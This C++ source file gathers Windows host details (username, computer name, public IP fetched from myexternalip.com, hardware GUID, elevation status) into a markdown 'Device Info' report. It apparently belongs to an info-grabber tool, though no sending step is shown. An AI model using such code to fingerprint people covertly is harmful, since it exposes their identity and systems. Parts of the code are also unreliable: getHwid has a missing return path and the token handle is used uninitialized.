#include "Info.h"
#include <windows.h>
#include <Lmcons.h>
#include<wininet.h>
#include<vector>
#include<string>


std::string WindowUser()
{
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameA((LPSTR)username, &username_len);
	return username;
}

std::string ComputerName()
{
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetComputerNameA((LPSTR)username, &username_len);
    return username;
}

std::string real_ip() {

    HINTERNET net = InternetOpenA("IP retriever",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0);

    HINTERNET conn = InternetOpenUrlA(net,
        "http://myexternalip.com/raw",
        NULL,
        0,
        INTERNET_FLAG_RELOAD,
        0);

    char buffer[4096];
    DWORD read;

    InternetReadFile(conn, buffer, sizeof(buffer) / sizeof(buffer[0]), &read);
    InternetCloseHandle(net);

    return std::string(buffer, read);
}

std::string getHwid()
{
    HW_PROFILE_INFOA hwProfileInfo;
    if (GetCurrentHwProfileA(&hwProfileInfo))
    {
        return hwProfileInfo.szHwProfileGuid;
    }
}

bool isUserAdmin() 
{
    bool isElevated = false;
    HANDLE token;
    TOKEN_ELEVATION elev;
    DWORD size;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        if (GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &size)) {
            isElevated = elev.TokenIsElevated;
        }
    }
    if (token) {
        CloseHandle(token);
        token = NULL;
    }
    return isElevated;
}

std::string CompileInfo()
{
    std::string info = "";
    info = "**Device Info** \\n";
    info += "PC Name - " + ComputerName() + " \\n";
    info += "Window User - " + WindowUser() + " \\n";
    info += "IP - " + real_ip() + " \\n";
    info += "GUID/HWID - " + getHwid() + " \\n";
    return info;
}
